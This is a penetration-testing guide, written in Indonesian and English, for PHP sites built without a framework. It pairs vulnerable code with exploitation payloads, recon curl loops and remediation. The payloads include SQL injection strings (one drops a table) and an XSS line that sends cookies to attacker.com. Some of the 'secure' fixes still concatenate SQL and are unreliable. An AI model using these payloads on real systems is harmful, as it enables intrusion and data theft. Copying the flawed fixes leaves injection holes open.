# 🔐 TESTING PHP NATIVE APPLICATIONS

## Panduan Lengkap Penetration Testing untuk Website PHP Native

---

## 📋 Daftar Isi
1. [Karakteristik PHP Native](#karakteristik-php-native)
2. [Common Vulnerabilities](#common-vulnerabilities)
3. [Testing Strategy](#testing-strategy)
4. [Checklists](#checklists)
5. [Remediation](#remediation)

---

## Karakteristik PHP Native

### Apa itu PHP Native?
PHP Native adalah website yang dibangun **tanpa framework** (seperti Laravel, Symfony, atau CodeIgniter), menggunakan PHP murni dengan:
- Direct file handling
- Manual routing/URL parsing
- Custom database connection
- Manual session management
- Direct form processing

### Keunikan & Risiko:
✅ **Advantages**:
- Lebih ringan dan cepat
- Full control atas code
- Minimal dependencies

⚠️ **Risks**:
- Lebih rentan karena no built-in protection
- Manual security implementation
- Developers harus aware tentang security
- Common mistakes lebih sering terjadi

---

## Common Vulnerabilities in PHP Native

### 1. SQL Injection (CRITICAL)

#### Tanda-Tanda:
```php
// ❌ VULNERABLE
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";  // Direct concatenation!

// ❌ VULNERABLE JUGA
$name = $_POST['name'];
$query = "INSERT INTO users (name) VALUES ('$name')";
```

#### Exploitation:
```
Input: 1' OR '1'='1
Query: SELECT * FROM users WHERE id = 1' OR '1'='1'
Result: Semua users terexpose

Input: '; DROP TABLE users; --
Query: SELECT * FROM users WHERE id = '; DROP TABLE users; --
Result: Table terhapus!
```

#### Deteksi Method:
```bash
# Scanner akan test:
- Basic boolean injection: ' OR '1'='1
- UNION-based: 1' UNION SELECT NULL--
- Time-based blind: 1' AND SLEEP(5)--
- Error-based: 1' AND extractvalue(1,concat(0x7e,(select version())))--
```

#### Remediasi:
```php
// ✅ SECURE - Use prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();

// ✅ ALTERNATIVE - Use PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$result = $stmt->fetchAll();

// ✅ Validate & sanitize input
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die("Invalid ID");
}
```

---

### 2. Cross-Site Scripting (XSS) (HIGH)

#### Tanda-Tanda:
```php
// ❌ VULNERABLE - Reflected XSS
echo "Welcome " . $_GET['name'];  // No escaping!

// ❌ VULNERABLE - Stored XSS
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (text) VALUES ('$comment')");
echo $comment;  // No escaping when displaying!

// ❌ VULNERABLE - DOM XSS
<script>
    var user = "<?php echo $_GET['user']; ?>";  // Dangerous!
</script>
```

#### Exploitation:
```
Reflected XSS Payload:
URL: example.com/?name=<script>alert('XSS')</script>
Result: Script executed di browser

Stored XSS Payload:
Input: <img src=x onerror="fetch('http://attacker.com/?cookie='+document.cookie)">
Result: Setiap user yang view page, cookies terkirim ke attacker
```

#### Deteksi Method:
```bash
# Scanner akan test:
- Basic tags: <script>alert('XSS')</script>
- Event handlers: <img src=x onerror=alert('XSS')>
- SVG vectors: <svg/onload=alert('XSS')>
- Attribute injection: " onfocus="alert('XSS')" autofocus="
```

#### Remediasi:
```php
// ✅ ESCAPE output
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

// ✅ Use templating engine with auto-escape
// Twig, Blade, etc. auto-escape by default

// ✅ Validate input
$name = preg_replace('/[^a-zA-Z0-9\s]/', '', $_GET['name']);
echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');

// ✅ For JavaScript context
<script>
    var user = <?php echo json_encode($_GET['user']); ?>;
</script>

// ✅ Set Content-Security-Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

---

### 3. Broken Authentication (HIGH)

#### Tanda-Tanda:
```php
// ❌ VULNERABLE - No password hashing
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

// ❌ VULNERABLE - Default credentials not removed
// admin:admin, test:test still exist

// ❌ VULNERABLE - Session not properly managed
session_id($_GET['sid']);  // User dapat set session ID!
$_SESSION['user'] = $user;

// ❌ VULNERABLE - No HTTPS
// Cookies sent in plaintext
```

#### Exploitation:
```
Default Credentials: admin:admin, admin:password
Credential Stuffing: Try common passwords
Session Fixation: Force user ke controlled session
```

#### Remediasi:
```php
// ✅ Hash passwords properly
$hashed_password = password_hash($_POST['password'], PASSWORD_BCRYPT);
mysqli_query($conn, "INSERT INTO users (password) VALUES ('$hashed_password')");

// ✅ Verify password
$user = mysqli_fetch_assoc(mysqli_query($conn, "SELECT * FROM users WHERE username='$user'"));
if (password_verify($_POST['password'], $user['password'])) {
    // Login success
    session_start();
    session_regenerate_id();
    $_SESSION['user_id'] = $user['id'];
}

// ✅ Secure session
ini_set('session.use_only_cookies', 1);
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_secure', 1);  // HTTPS only
ini_set('session.cookie_httponly', 1); // No JavaScript access
ini_set('session.cookie_samesite', 'Strict');

// ✅ Remove default credentials
// Ensure admin account doesn't have default password
```

---

### 4. Sensitive Data Exposure (HIGH)

#### Tanda-Танда:
```php
// ❌ VULNERABLE - Sensitive files accessible
// .env, config.php, database.sql, backup files publicly accessible

// ❌ VULNERABLE - Debug info exposed
var_dump($_POST);
print_r($database_password);

// ❌ VULNERABLE - Logs accessible
// logs/ directory publicly readable

// ❌ VULNERABLE - Source code exposed
// .git, .svn directories publicly accessible
```

#### Exploitation:
```
Access .env:
GET /.env
Returns: DB_HOST=localhost, DB_USER=root, DB_PASS=password

Access config.php:
GET /config.php
Returns: Database credentials, API keys

Access backup.sql:
GET /backup.sql
Download entire database
```

#### Remediation:
```php
// ✅ Configure web server to prevent access
// In .htaccess (Apache)
<FilesMatch "\.env|\.git|backup\.sql|config\.php">
    Order Allow,Deny
    Deny from all
</FilesMatch>

<Directory ~ "^\.|^/">
    <FilesMatch "^\.">
        Order allow,deny
        Deny from all
    </FilesMatch>
</Directory>

// ✅ Or in nginx config
location ~ /\. {
    deny all;
}

location ~ backup\.sql|\.env|config\.php {
    deny all;
}

// ✅ Keep .env outside web root
// Structure:
// /home/user/
//   /webapp/  <- Web root (public_html)
//     index.php
//   /.env     <- Protected

// Load dengan:
// include __DIR__ . '/../.env';
```

---

### 5. Broken Access Control (CRITICAL)

#### Tanda-Tanda:
```php
// ❌ VULNERABLE - No authorization check
if (isset($_SESSION['user'])) {
    // Show all data regardless of who user is
    $data = mysqli_query($conn, "SELECT * FROM orders");
}

// ❌ VULNERABLE - Authorization based on user input
$user_id = $_GET['user_id'];
$data = mysqli_query($conn, "SELECT * FROM users WHERE id = $user_id");

// ❌ VULNERABLE - No CSRF token
<form method="POST" action="/delete_user.php">
    <input type="hidden" name="user_id" value="1">
</form>

// ❌ VULNERABLE - No privilege check
if ($_POST['action'] == 'delete_user') {
    mysqli_query($conn, "DELETE FROM users WHERE id = " . $_POST['user_id']);
}
```

#### Exploitation:
```
1. Horizontal Privilege Escalation:
   GET /user_profile.php?id=1  -> My profile
   GET /user_profile.php?id=2  -> Other user's profile (BREACH!)

2. Vertical Privilege Escalation:
   Normal user can access: /admin/panel

3. CSRF Attack:
   Attacker creates: <img src="example.com/delete_user.php?id=1">
   Victim clicks link -> Admin deleted!
```

#### Remediasi:
```php
// ✅ Proper authorization check
session_start();
if (!isset($_SESSION['user_id'])) {
    die("Not authenticated");
}

// Check if user can access this resource
$requested_user_id = $_GET['user_id'];
if ($_SESSION['user_id'] != $requested_user_id) {
    // Admin can see everyone
    $user = mysqli_fetch_assoc(mysqli_query($conn, "SELECT role FROM users WHERE id=" . $_SESSION['user_id']));
    if ($user['role'] != 'admin') {
        die("Not authorized");
    }
}

// ✅ Implement CSRF protection
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// In form
<form method="POST">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
</form>

// Validate token
if (empty($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF token validation failed");
}

// ✅ Use proper role-based access control
function check_permission($required_role) {
    if ($_SESSION['user_role'] != $required_role && $_SESSION['user_role'] != 'admin') {
        http_response_code(403);
        die("Forbidden");
    }
}

check_permission('user');  // Check before accessing resource
```

---

### 6. Insecure File Upload (HIGH)

#### Tanda-Tanda:
```php
// ❌ VULNERABLE - No file type check
$file = $_FILES['upload'];
move_uploaded_file($file['tmp_name'], 'uploads/' . $file['name']);

// ❌ VULNERABLE - Only client-side validation
// HTML: <input type="file" accept=".jpg">
// Can be bypassed!

// ❌ VULNERABLE - File accessible from web
// /uploads/malicious.php dapat diakses & executed

// ❌ VULNERABLE - Path traversal
move_uploaded_file($file['tmp_name'], $_GET['path'] . $file['name']);
// Input: ../../../
```

#### Exploitation:
```
1. Upload executable:
   Upload: shell.php (contains malicious code)
   Access: example.com/uploads/shell.php
   Result: Code executed on server!

2. Path traversal:
   Upload path: ../../../
   Filename: shell.php
   Result: Shell uploaded outside intended directory

3. Double extension:
   Upload: shell.php.jpg
   Naive check thinks it's image
   Result: Executed as PHP!
```

#### Remediasi:
```php
// ✅ Proper file upload handling
if ($_FILES['file']['error'] != UPLOAD_ERR_OK) {
    die("Upload error");
}

// Check MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime_type, $allowed_mimes)) {
    die("Invalid file type");
}

// Generate random filename
$new_filename = bin2hex(random_bytes(16)) . '.' . pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);

// Store outside web root
$upload_dir = '/var/uploads/';  // Not in public_html!
$file_path = $upload_dir . $new_filename;

move_uploaded_file($_FILES['file']['tmp_name'], $file_path);

// ✅ Configure web server to prevent execution
// In .htaccess
<Directory "/var/uploads">
    <FilesMatch "\.(php|php3|php4|php5|php7|phtml|phar|exe|sh|pl)$">
        Order Allow,Deny
        Deny from all
    </FilesMatch>
    AddType text/plain .php .phtml .php3 .php4 .php5 .php7
</Directory>

// ✅ Limit file size
if ($_FILES['file']['size'] > 5 * 1024 * 1024) {  // 5MB limit
    die("File too large");
}
```

---

### 7. Insecure Direct Object Reference (IDOR) (HIGH)

#### Tanda-Tanda:
```php
// ❌ VULNERABLE
$invoice_id = $_GET['id'];
$invoice = mysqli_query($conn, "SELECT * FROM invoices WHERE id = $invoice_id");

// User dapat mengubah ID dan lihat invoice user lain!

// ❌ VULNERABLE - API
GET /api/user/1/profile  -> My profile
GET /api/user/2/profile  -> Other user (BREACH!)
```

#### Remediasi:
```php
// ✅ Verify user owns resource
$resource_id = $_GET['id'];
$resource = mysqli_fetch_assoc(mysqli_query($conn, 
    "SELECT * FROM resources WHERE id = $resource_id AND user_id = " . $_SESSION['user_id']
));

if (!$resource) {
    http_response_code(404);
    die("Resource not found");
}

// ✅ Use access matrix
$allowed_ids = get_user_accessible_ids($_SESSION['user_id']);
if (!in_array($resource_id, $allowed_ids)) {
    die("Access denied");
}
```

---

## Testing Strategy untuk PHP Native

### Phase 1: Reconnaissance (30 menit)
```bash
# Scan technologies
curl -I https://target.com
# Look for: Server header, X-Powered-By, etc.

# Find directories
for dir in admin config api backup uploads logs; do
    curl -I https://target.com/$dir
done

# Check for common files
for file in .env config.php .git backup.sql; do
    curl -I https://target.com/$file
done

# Identify CMS/Framework
# PHP Native usually no obvious framework signs
```

### Phase 2: Injection Testing (45 menit)
```bash
# SQL Injection
python3 security_scanner.py https://target.com --sqli-test

# Key areas:
# - Login forms
# - Search functions
# - Filter/Sort parameters
# - API endpoints

# Test manually:
# /search.php?q=1' OR '1'='1
# /product.php?id=1 UNION SELECT NULL,user(),version()--
# /login.php?username=admin' --&password=anything
```

### Phase 3: XSS Testing (30 menit)
```bash
# Reflected XSS
# /search.php?q=<script>alert('XSS')</script>
# /profile.php?name=<img src=x onerror=alert('XSS')>

# Stored XSS
# Comments, feedback forms, reviews
# Submit: <img src=x onerror="alert('XSS')">
# Check if payload executed on retrieval

# DOM XSS
# Look at JavaScript in HTML
# Check if user input used directly in JS
```

### Phase 4: Authentication Testing (45 menit)
```bash
# Default credentials
# admin:admin, admin:password, root:root, test:test

# Session analysis
curl -v https://target.com/login.php
# Check: HttpOnly, Secure, SameSite flags

# Password reset flaws
# Predictable tokens?
# Can reset other users?

# Login bypass
# SQL injection in credentials
# Null bytes: admin\0 OR 1=1--
```

### Phase 5: Authorization Testing (30 menit)
```bash
# IDOR testing
# /profile.php?id=1  -> My profile
# /profile.php?id=2  -> Other user (breach!)
# /profile.php?id=999 -> Admin profile?

# Privilege escalation
# Access /admin.php as regular user?
# Change user role in session/cookie?

# CSRF testing
# Forms without CSRF token?
# Can repeat actions from external site?
```

### Phase 6: File & Data Testing (30 menit)
```bash
# Sensitive files
for file in .env config.php .git backup.sql database.sql test.php info.php; do
    curl https://target.com/$file
done

# File upload
# Upload PHP file as image?
# Path traversal: ../../../shell.php?

# Directory listing
curl https://target.com/uploads/
curl https://target.com/backup/
```

### Phase 7: API Testing (30 menit)
```bash
# Find API endpoints
curl https://target.com/api/
curl https://target.com/api/v1/

# Test unauthenticated access
curl https://target.com/api/v1/users

# Test authorization
curl -H "Authorization: Bearer fake_token" https://target.com/api/v1/admin

# Check CORS
curl -H "Origin: https://evil.com" https://target.com/api/data
# Look for: Access-Control-Allow-Origin header
```

---

## Checklists

### Pre-Scan Checklist
- [ ] Have written permission to test
- [ ] Target URL confirmed
- [ ] VPN/Proxy configured if needed
- [ ] Backup of current state taken
- [ ] Stakeholders notified
- [ ] Time window agreed upon
- [ ] Scanner dependencies installed

### SQL Injection Checklist
- [ ] Test GET parameters with quotes
- [ ] Test POST data (form fields)
- [ ] Test PUT/PATCH if API present
- [ ] Test HTTP headers (User-Agent, Referer)
- [ ] Test file uploads (name, type)
- [ ] Look for time-based queries
- [ ] Check for error-based leakage
- [ ] Test UNION-based injection
- [ ] Test boolean-based blind SQL
- [ ] Test out-of-band (if applicable)

### XSS Checklist
- [ ] Test all input fields (text, textarea, hidden)
- [ ] Test URL parameters
- [ ] Test POST body
- [ ] Test stored data (check reflection)
- [ ] Test DOM-based XSS
- [ ] Check for JavaScript event handlers
- [ ] Test special characters: <>"'();
- [ ] Test encoded payloads
- [ ] Check CSP headers
- [ ] Test different context (HTML, JS, CSS, URL)

### Authentication Checklist
- [ ] Test default credentials
- [ ] Test credential stuffing
- [ ] Check password requirements
- [ ] Test session management
- [ ] Test password reset functionality
- [ ] Check for account enumeration
- [ ] Test concurrent sessions
- [ ] Check logout functionality
- [ ] Test "Remember me" functionality
- [ ] Check JWT/token handling

### Authorization Checklist
- [ ] Test horizontal privilege escalation
- [ ] Test vertical privilege escalation
- [ ] Test IDOR (direct object reference)
- [ ] Check resource-level access
- [ ] Test function-level access
- [ ] Test data-level access
- [ ] Check CORS misconfiguration
- [ ] Test path traversal
- [ ] Test parameter pollution
- [ ] Test method override

### Data Protection Checklist
- [ ] Verify HTTPS usage
- [ ] Check SSL/TLS version
- [ ] Check certificate validity
- [ ] Test sensitive data in logs
- [ ] Check HTTP to HTTPS redirect
- [ ] Test data in transit encryption
- [ ] Test data at rest encryption
- [ ] Check backup security
- [ ] Look for hardcoded credentials
- [ ] Check for debug information

---

## Remediation Priority Matrix

### CRITICAL (Fix Within 24 Hours)
1. SQL Injection with data breach potential
2. RCE (Remote Code Execution)
3. Authentication bypass
4. Sensitive file exposure (.env, database backups)
5. Critical privilege escalation

### HIGH (Fix Within 3 Days)
1. Stored XSS
2. Broken access control (IDOR)
3. Insecure file upload
4. Missing HTTPS/TLS
5. API authentication bypass

### MEDIUM (Fix Within 2 Weeks)
1. Missing security headers
2. Weak password policy
3. Reflected XSS
4. CSRF without token
5. Information disclosure

### LOW (Fix When Possible)
1. Version information leakage
2. Directory listing enabled
3. Non-essential debug information
4. Minor UI issues
5. Documentation improvements

---

## Remediation Code Examples

### SQL Injection Fix
```php
// BEFORE (VULNERABLE)
$name = $_POST['name'];
$query = "INSERT INTO users (name) VALUES ('$name')";

// AFTER (SECURE)
$name = $_POST['name'];
$stmt = $conn->prepare("INSERT INTO users (name) VALUES (?)");
$stmt->bind_param("s", $name);
$stmt->execute();
```

### XSS Fix
```php
// BEFORE (VULNERABLE)
<?php echo $_GET['search']; ?>

// AFTER (SECURE)
<?php echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8'); ?>
```

### Authentication Fix
```php
// BEFORE (VULNERABLE)
$pwd = $_POST['password'];
if (mysqli_query($conn, "SELECT * FROM users WHERE pwd='$pwd'")) {
    $_SESSION['authenticated'] = true;
}

// AFTER (SECURE)
$pwd = password_hash($_POST['password'], PASSWORD_BCRYPT);
if (password_verify($_POST['password'], $stored_hash)) {
    session_regenerate_id();
    $_SESSION['user_id'] = $user['id'];
}
```

### CSRF Protection Fix
```php
// BEFORE (VULNERABLE)
<form method="POST" action="/delete.php">
    <input type="hidden" name="id" value="1">
</form>

// AFTER (SECURE)
<form method="POST" action="/delete.php">
    <input type="hidden" name="id" value="1">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
</form>

<?php
if (empty($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF validation failed");
}
?>
```

---

## Resources

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PHP Security: https://www.php.net/manual/en/security.php
- CWE Top 25: https://cwe.mitre.org/top25/
- PortSwigger Web Security Academy: https://portswigger.net/web-security

---

**Last Updated**: 2024-02-04
